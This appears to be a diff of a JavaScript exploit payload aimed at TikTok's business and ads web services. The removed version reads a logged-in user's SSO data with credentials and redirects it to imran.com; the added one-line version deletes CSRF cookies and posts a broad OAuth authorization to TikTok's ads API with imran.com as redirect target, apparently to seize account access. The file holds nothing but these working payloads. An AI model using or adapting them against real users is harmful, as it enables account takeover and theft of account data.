@@ -1,9 +1,1 @@
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'https://business-sso.tiktok.com/check_login/?aid=2239&service=https://business.tiktok.com/select&language=en&appId=2239&lang=en&host=https://business-sso.tiktok.com/', true);
-xhr.withCredentials = true;
-xhr.onload = () => {
-   const data = JSON.parse(xhr.responseText);
-   var imran = JSON.stringify(data);
-   location.replace("https://imran.com/?DATA=" + imran);
-};
-xhr.send();
+document.cookie='csrftoken=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/';document.cookie='ac_csrftoken=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/';document.cookie='passport_csrf_token=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/';document.cookie='passport_csrf_token_default=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/';var x=new XMLHttpRequest();x.open("POST","https://ads.tiktok.com/marketing_api/api/advertiser/authorize/?msToken=&X-Bogus=&_signature=",!0);x.setRequestHeader("Content-Type","application/json");x.onreadystatechange=function(){4===x.readyState&&alert(x.responseText)};x.send(JSON.stringify({scope:[10000,1,2,4,6,7,8,3,9,18000000,15000000,12000000,19000000,5,13000000,14000000,16000000,17000000,"7043626160646946818","7050363942434013185","7263200645266554881","7294180478502830081","7302558519668703234","7336834092152913922","7420916749769408513"],redirect:!0,state:"your_custom_params",timezone_name:"Asia/Kolkata",browser_language:"en-US",cookie_enabled:!0,screen_width:1710,screen_height:955,browser_platform:"MacIntel",browser_name:"Mozilla",browser_version:"5.0 (Macintosh)",initial_timestamp:"1746595155153",client_id:"7480799711721439248",user_type:1,redirect_uri:"https://imran.com"}));
